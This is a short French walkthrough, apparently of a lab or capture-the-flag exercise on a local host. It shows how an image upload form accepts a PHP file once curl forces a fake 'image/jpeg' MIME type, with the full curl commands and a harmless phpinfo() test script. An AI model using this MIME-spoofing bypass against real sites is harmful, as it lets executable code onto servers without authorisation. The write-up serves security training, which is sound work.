En accédant à la page :

http://192.168.1.87/?page=upload

<img width="1301" height="653" alt="image" src="https://github.com/user-attachments/assets/fdc32eaa-c7a1-4242-a51a-b7e5442fc610" />

Le site propose uniquement l’envoi d’une image via un formulaire :

un champ "Choose an image to upload"

un bouton UPLOAD

En inspectant la requête envoyée par le navigateur après un upload d’image, on remarque :

La requête est un POST multipart/form-data

Le formulaire contient 3 éléments :

MAX_FILE_SIZE=100000
uploaded=[contenu du fichier]
Upload=Upload

On teste d’abord avec une image flow.jpg :
curl -i -X POST \
-F "MAX_FILE_SIZE=100000" \
-F "uploaded=@flower.jpg" \
-F "Upload=Upload" \
"http://192.168.1.87/?page=upload"

On crée un fichier PHP simple :

script.php

<?php phpinfo(); ?>

<img width="411" height="239" alt="image" src="https://github.com/user-attachments/assets/063cb96f-a2bc-4bec-9854-e4aa1e2e0a4f" />


On tente de l’uploader :

curl -i -X POST \
-F "MAX_FILE_SIZE=100000" \
-F "uploaded=@script.php" \
-F "Upload=Upload" \
"http://192.168.1.87/?page=upload"

Curl permet de forcer un faux type MIME :

-F "uploaded=@script.php;type=image/jpeg"

curl -i -X POST \
-F "MAX_FILE_SIZE=100000" \
-F "uploaded=@script.php;type=image/jpeg" \
-F "Upload=Upload" \
"http://192.168.1.87/?page=upload"

<img width="889" height="717" alt="image" src="https://github.com/user-attachments/assets/886b08d6-e1bc-4d85-abc4-36848870ebf3" />






